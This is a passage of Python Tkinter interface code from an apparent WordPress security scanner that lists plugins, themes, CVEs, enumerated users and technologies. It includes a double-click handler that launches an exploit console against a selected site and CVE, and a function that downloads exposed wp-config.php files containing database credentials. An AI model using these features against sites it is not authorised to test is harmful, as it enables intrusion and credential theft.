                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="Vulnerabilities Found:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        vuln_count = len(result["vulnerabilities"])
        vuln_text = f"{vuln_count} vulnerabilities detected" if vuln_count > 0 else "No vulnerabilities found"
        vuln_color = "red" if vuln_count > 0 else "green"
        ttk.Label(scrollable_frame, text=vuln_text, font=("Segoe UI", 10), 
                 foreground=vuln_color).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="Login Page:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        if result["login_page"] != "Not found":
            login_frame = ttk.Frame(scrollable_frame)
            login_frame.pack(anchor=tk.W, pady=2, padx=10)
            ttk.Label(login_frame, text=result["login_page"], 
                     font=("Segoe UI", 10)).pack(side=tk.LEFT)
            ttk.Button(login_frame, text="Open", width=8, style="Accent.TButton",
                      command=lambda: webbrowser.open(result["login_page"])).pack(side=tk.LEFT, padx=5)
        else:
            ttk.Label(scrollable_frame, text="Not found", 
                     font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="User Registration:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        reg_color = "orange" if result["registration_enabled"] == "Enabled" else "green"
        ttk.Label(scrollable_frame, text=result["registration_enabled"], 
                 font=("Segoe UI", 10), foreground=reg_color).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="DB Backup Directory:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        db_color = "red" if result["db_backup_found"] == "Found" else "green"
        ttk.Label(scrollable_frame, text=result["db_backup_found"], 
                 font=("Segoe UI", 10), foreground=db_color).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="XML-RPC Enabled:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        xmlrpc_color = "red" if result["xmlrpc_found"] == "Found" else "green"
        ttk.Label(scrollable_frame, text=result["xmlrpc_found"], 
                 font=("Segoe UI", 10), foreground=xmlrpc_color).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="Scan Status:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        status_label = ttk.Label(scrollable_frame, text=result["status"], 
                               font=("Segoe UI", 10))
        status_label.pack(anchor=tk.W, pady=2, padx=10)
        if "Error" in result["status"]:
            status_label.configure(foreground="red")
        ttk.Label(scrollable_frame, text="Scan Time:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=f"{result['scan_time']:.2f} seconds", 
                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=2, padx=10)
        ttk.Label(scrollable_frame, text="Scan Timestamp:", 
                 font=("Segoe UI", 10, "bold")).pack(anchor=tk.W, pady=2)
        ttk.Label(scrollable_frame, text=result["timestamp"], 
                 font=("Segoe UI", 10)).pack(anchor=tk.W, pady=10)
        scrollable_frame.update_idletasks()
        canvas.config(scrollregion=canvas.bbox("all"))

    def update_plugins_tab(self, result):
        for widget in self.plugins_tab.winfo_children():
            widget.destroy()
        if not result["plugins"]:
            ttk.Label(self.plugins_tab, text="No plugins detected", 
                     font=("Segoe UI", 12)).pack(pady=20)
            return
        container = ttk.Frame(self.plugins_tab)
        container.pack(fill=tk.BOTH, expand=True)
        columns = ("name", "version", "vulns", "path")
        tree = ttk.Treeview(container, columns=columns, show="headings", height=10)
        tree.heading("name", text="Plugin Name")
        tree.heading("version", text="Version")
        tree.heading("vulns", text="Vulnerabilities")
        tree.heading("path", text="Path")
        tree.column("name", width=250, minwidth=200, stretch=True)
        tree.column("version", width=100, minwidth=80, stretch=False)
        tree.column("vulns", width=120, minwidth=100, stretch=False)
        tree.column("path", width=300, minwidth=250, stretch=True)
        v_scroll = ttk.Scrollbar(container, orient="vertical", command=tree.yview)
        h_scroll = ttk.Scrollbar(container, orient="horizontal", command=tree.xview)
        tree.configure(yscrollcommand=v_scroll.set, xscrollcommand=h_scroll.set)
        tree.grid(row=0, column=0, sticky="nsew")
        v_scroll.grid(row=0, column=1, sticky="ns")
        h_scroll.grid(row=1, column=0, sticky="ew")
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)
        for plugin, data in result["plugins"].items():
            plugin_vulns = [v for v in result["vulnerabilities"] if plugin in v.get("type", "")]
            vuln_count = len(plugin_vulns)
            tags = []
            if vuln_count > 0:
                tags.append("vulnerable")
            tree.insert("", tk.END, values=(
                plugin,
                data["version"],
                f"{vuln_count} vulnerabilities" if vuln_count > 0 else "None",
                data.get("path", "")
            ), tags=tags)
        tree.tag_configure("vulnerable", background="#2d0000")
    
    def update_themes_tab(self, result):
        for widget in self.themes_tab.winfo_children():
            widget.destroy()
        if not result["themes"]:
            ttk.Label(self.themes_tab, text="No themes detected", 
                     font=("Segoe UI", 12)).pack(pady=20)
            return
        container = ttk.Frame(self.themes_tab)
        container.pack(fill=tk.BOTH, expand=True)
        columns = ("name", "version", "vulns", "path")
        tree = ttk.Treeview(container, columns=columns, show="headings", height=10)
        tree.heading("name", text="Theme Name")
        tree.heading("version", text="Version")
        tree.heading("vulns", text="Vulnerabilities")
        tree.heading("path", text="Path")
        tree.column("name", width=250, minwidth=200, stretch=True)
        tree.column("version", width=100, minwidth=80, stretch=False)
        tree.column("vulns", width=120, minwidth=100, stretch=False)
        tree.column("path", width=300, minwidth=250, stretch=True)
        v_scroll = ttk.Scrollbar(container, orient="vertical", command=tree.yview)
        h_scroll = ttk.Scrollbar(container, orient="horizontal", command=tree.xview)
        tree.configure(yscrollcommand=v_scroll.set, xscrollcommand=h_scroll.set)
        tree.grid(row=0, column=0, sticky="nsew")
        v_scroll.grid(row=0, column=1, sticky="ns")
        h_scroll.grid(row=1, column=0, sticky="ew")
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)
        
        for theme, data in result["themes"].items():
            # FIX: Properly count theme vulnerabilities
            theme_vulns = [v for v in result["vulnerabilities"] 
                          if v.get("type", "").startswith("Theme:") and theme in v.get("type", "")]
            vuln_count = len(theme_vulns)
            tags = []
            if vuln_count > 0:
                tags.append("vulnerable")
            tree.insert("", tk.END, values=(
                theme,
                data["version"],
                f"{vuln_count} vulnerabilities" if vuln_count > 0 else "None",
                data.get("path", "")
            ), tags=tags)
        tree.tag_configure("vulnerable", background="#2d0000")
        
    def update_vulns_tab(self, result):
        for widget in self.vulns_tab.winfo_children():
            widget.destroy()
        if not result["vulnerabilities"]:
            ttk.Label(self.vulns_tab, text="No vulnerabilities found", 
                     font=("Segoe UI", 12)).pack(pady=20)
            return
        container = ttk.Frame(self.vulns_tab)
        container.pack(fill=tk.BOTH, expand=True)
        
        # FIX: Added description column
        columns = ("severity", "cve", "type", "description", "vuln_index")
        tree = ttk.Treeview(container, columns=columns, show="headings", height=10)
        tree.heading("severity", text="Severity")
        tree.heading("cve", text="CVE ID")
        tree.heading("type", text="Type")
        tree.heading("description", text="Description")
        tree.column("severity", width=100, minwidth=80, stretch=False)
        tree.column("cve", width=120, minwidth=100, stretch=False)
        tree.column("type", width=200, minwidth=150, stretch=True)
        tree.column("description", width=300, minwidth=250, stretch=True)
        tree.column("vuln_index", width=0, stretch=False, anchor=tk.W)
        v_scroll = ttk.Scrollbar(container, orient="vertical", command=tree.yview)
        h_scroll = ttk.Scrollbar(container, orient="horizontal", command=tree.xview)
        tree.configure(yscrollcommand=v_scroll.set, xscrollcommand=h_scroll.set)
        tree.grid(row=0, column=0, sticky="nsew")
        v_scroll.grid(row=0, column=1, sticky="ns")
        h_scroll.grid(row=1, column=0, sticky="ew")
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)
        
        severity_icons = {
            "critical": "🔥 CRITICAL",
            "high": "❗ HIGH",
            "medium": "⚠️ MEDIUM",
            "low": "ℹ️ LOW"
        }
        self.vulnerabilities = result["vulnerabilities"]
        for i, vuln in enumerate(self.vulnerabilities):
            severity = vuln.get("severity", "medium").lower()
            icon = severity_icons.get(severity, "❓ UNKNOWN")
            cve_id = vuln.get("cve", "N/A")
            description = vuln.get("description", "")[:100] + "..." if len(vuln.get("description", "")) > 100 else vuln.get("description", "")
            
            tree.insert("", tk.END, values=(
                icon,
                cve_id,
                vuln.get("type", ""),
                description,
                i
            ), tags=(severity,))
        
        tree.tag_configure("critical", background="#2d0000", foreground="#ff6b6b")
        tree.tag_configure("high", background="#2d1a00", foreground="#ffa94d")
        tree.tag_configure("medium", background="#2d2d00", foreground="#ffe066")
        tree.tag_configure("low", background="#002d0f", foreground="#8ce99a")
        self.vuln_tree = tree
        tree.bind("<<TreeviewSelect>>", self.on_vuln_select)        
        tree.bind("<Double-1>", self.run_vuln_exploit)

    def on_vuln_select(self, event):
        selection = self.vuln_tree.selection()
        if not selection:
            self.current_vuln = None
            return
        item = selection[0]
        vuln_index = int(self.vuln_tree.set(item, "vuln_index"))
        self.current_vuln = self.vulnerabilities[vuln_index]        

    def run_vuln_exploit(self, event):
        self.on_vuln_select(event)
        if not self.current_vuln:
            return
        selection = self.results_tree.selection()
        if not selection:
            messagebox.showwarning("Selection Error", "Please select a website first")
            return
        item = selection[0]
        url = self.results_tree.item(item, "values")[0]
        cve_id = self.current_vuln.get("cve")
        if not cve_id:
            messagebox.showwarning("Error", "No CVE ID found for this vulnerability")
            return
        self.show_exploit_console()
        self.exploit_url_entry.delete(0, tk.END)
        self.exploit_url_entry.insert(0, url)
        self.vuln_combo.delete(0, tk.END)
        self.vuln_combo.insert(0, cve_id)
        self.start_exploit()

    def update_users_tab(self, result):
        for widget in self.users_tab.winfo_children():
            widget.destroy()
        if not result["users"]:
            ttk.Label(self.users_tab, text="No users detected", 
                     font=("Segoe UI", 12)).pack(pady=20)
            return
        container = ttk.Frame(self.users_tab)
        container.pack(fill=tk.BOTH, expand=True)
        
        # FIX: Added canvas for proper scrolling
        canvas = tk.Canvas(container, highlightthickness=0)
        scrollbar = ttk.Scrollbar(container, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        ttk.Label(scrollable_frame, text="Detected WordPress Users:", 
                 font=("Segoe UI", 11, "bold")).pack(anchor=tk.W, pady=(0, 10))
        
        # FIX: Use grid layout for better organization
        user_frame = ttk.Frame(scrollable_frame)
        user_frame.pack(fill=tk.BOTH, expand=True)
        
        for i, user in enumerate(result["users"]):
            row = i // 3
            col = i % 3
            card = ttk.LabelFrame(user_frame, text=user, padding=10)
            card.grid(row=row, column=col, padx=10, pady=10, sticky="nsew")
            ttk.Button(card, text="Analyze", width=10, 
                      style="Accent.TButton", 
                      command=lambda u=user: self.analyze_user(u)).pack(pady=5)
            
            # Make sure columns expand properly
            user_frame.columnconfigure(col, weight=1)
        
        # Make sure rows expand properly
        for r in range(row + 1):
            user_frame.rowconfigure(r, weight=1)

    def analyze_user(self, username):
        selection = self.results_tree.selection()
        if not selection:
            messagebox.showwarning("Selection Error", "Please select a website first")
            return
        item = selection[0]
        url = self.results_tree.item(item, "values")[0]
        analysis = self.scanner.analyze_user(url, username)
        analysis_window = tk.Toplevel(self)
        analysis_window.title(f"User Analysis: {username}")
        analysis_window.geometry("600x400")
        frame = ttk.Frame(analysis_window, padding=20)
        frame.pack(fill=tk.BOTH, expand=True)
        ttk.Label(frame, text=f"Analysis for user: {username}", 
                 font=("Segoe UI", 14, "bold")).grid(row=0, column=0, columnspan=2, sticky="w", pady=(0, 15))
        row = 1
        for key, value in analysis.items():
            if key == "posts_urls" and value:
                ttk.Label(frame, text=f"{key.replace('_', ' ').title()}:", 
                         font=("Segoe UI", 10, "bold")).grid(row=row, column=0, sticky="w", padx=5)
                ttk.Label(frame, text=str(len(value)), 
                         font=("Segoe UI", 10)).grid(row=row, column=1, sticky="w", padx=5)
                row += 1
                ttk.Label(frame, text="Post URLs:", 
                         font=("Segoe UI", 10, "bold")).grid(row=row, column=0, sticky="nw", padx=5, pady=(10, 0))
                list_frame = ttk.Frame(frame)
                list_frame.grid(row=row, column=1, sticky="nsew", padx=5, pady=(10, 0))
                scrollbar = ttk.Scrollbar(list_frame)
                scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
                url_list = tk.Listbox(list_frame, yscrollcommand=scrollbar.set, height=5)
                for url in value:
                    url_list.insert(tk.END, url)
                url_list.pack(fill=tk.BOTH, expand=True)
                scrollbar.config(command=url_list.yview)
                url_list.bind("<Double-1>", lambda e: webbrowser.open(url_list.get(url_list.curselection()[0])))
                row += 1
            elif key not in ["error", "posts_urls"]:
                ttk.Label(frame, text=f"{key.replace('_', ' ').title()}:", 
                         font=("Segoe UI", 10, "bold")).grid(row=row, column=0, sticky="w", padx=5)
                ttk.Label(frame, text=str(value), 
                         font=("Segoe UI", 10)).grid(row=row, column=1, sticky="w", padx=5)
                row += 1
        if analysis.get("author_url"):
            ttk.Button(frame, text="Open Author Page", style="Accent.TButton",
                      command=lambda: webbrowser.open(analysis["author_url"])).grid(row=row, column=0, columnspan=2, pady=10)
        frame.grid_columnconfigure(1, weight=1)
        frame.grid_rowconfigure(row, weight=1)

    def update_tech_tab(self, result):
        for widget in self.tech_tab.winfo_children():
            widget.destroy()
        if not result["technologies"]:
            ttk.Label(self.tech_tab, text="No technologies detected", 
                     font=("Segoe UI", 12)).pack(pady=20)
            return
        container = ttk.Frame(self.tech_tab)
        container.pack(fill=tk.BOTH, expand=True)
        canvas = tk.Canvas(container, highlightthickness=0)
        scrollbar = ttk.Scrollbar(container, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        ttk.Label(scrollable_frame, text="Detected Technologies:", 
                 font=("Segoe UI", 11, "bold")).pack(anchor=tk.W, pady=(0, 10))
        tech_frame = ttk.Frame(scrollable_frame)
        tech_frame.pack(fill=tk.BOTH, expand=True)
        tech_icons = {
            "wordpress": "🌐",
            "apache": "🖥️",
            "nginx": "🖥️",
            "mysql": "💾",
            "php": "🐘",
            "jquery": "📊",
            "bootstrap": "🎨",
            "react": "⚛️",
            "woocommerce": "🛒",
            "elementor": "🎭"
        }
        for i, tech in enumerate(result["technologies"]):
            icon_key = next((k for k in tech_icons if k in tech.lower()), "🔍")
            icon = tech_icons.get(icon_key, "🔍")
            card = ttk.Frame(tech_frame, style="Card.TFrame", padding=10)
            card.grid(row=i//4, column=i%4, padx=10, pady=10, sticky="nsew")
            ttk.Label(card, text=f"{icon} {tech}", style="Card.TLabel", 
                     font=("Segoe UI", 11)).pack(anchor=tk.W)
            ttk.Button(card, text="Info", width=8, 
                      style="Accent.TButton").pack(anchor=tk.E, pady=(5, 0))
        for i in range(4):
            tech_frame.columnconfigure(i, weight=1)
    
    def update_config_tab(self, result):
        for widget in self.config_tab.winfo_children():
            widget.destroy()
        if not result["wp_config_files"]:
            ttk.Label(self.config_tab, text="No wp-config files found", 
                     font=("Segoe UI", 12)).pack(pady=20)
            return
        frame = ttk.Frame(self.config_tab, padding=10)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        ttk.Label(frame, text="Accessible wp-config Files:", 
                 font=("Segoe UI", 11, "bold")).pack(anchor=tk.W, pady=(0, 10))
        list_frame = ttk.Frame(frame)
        list_frame.pack(fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.config_list = tk.Listbox(
            list_frame, 
            font=("Segoe UI", 11), 
            yscrollcommand=scrollbar.set, 
            selectmode=tk.SINGLE,
            bg="#2d3748", 
            fg="#e2e8f0", 
            highlightthickness=0,
            height=8
        )
        self.config_list.pack(fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.config_list.yview)
        for config in result["wp_config_files"]:
            self.config_list.insert(tk.END, config)
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, pady=(10, 0))
        ttk.Button(btn_frame, text="View Selected", style="Accent.TButton",
                  command=self.view_config_file).pack(side=tk.LEFT, padx=5)
    
    def view_config_file(self):
        selection = self.config_list.curselection()
        if not selection:
            return
        config_url = self.config_list.get(selection[0])
        try:
            response = requests.get(config_url, timeout=5)
            if response.status_code == 200:
                config_window = tk.Toplevel(self)
                config_window.title(f"wp-config.php - {config_url}")
                config_window.geometry("800x600")
                text_frame = ttk.Frame(config_window)
                text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
                config_text = scrolledtext.ScrolledText(text_frame, wrap=tk.WORD, 
                                                      font=("Consolas", 10))
                config_text.pack(fill=tk.BOTH, expand=True)
                config_text.insert(tk.END, response.text)
                config_text.config(state=tk.DISABLED)
                warn_frame = ttk.Frame(config_window)
                warn_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
                ttk.Label(warn_frame, text="WARNING: This file may contain sensitive database credentials!", 
                         foreground="red", font=("Segoe UI", 10, "bold")).pack()
            else:
                messagebox.showerror("Error", f"Failed to retrieve config file. Status: {response.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to retrieve config file: {str(e)}")

if __name__ == "__main__":
    app = ProfessionalScannerGUI()
    app.mainloop()
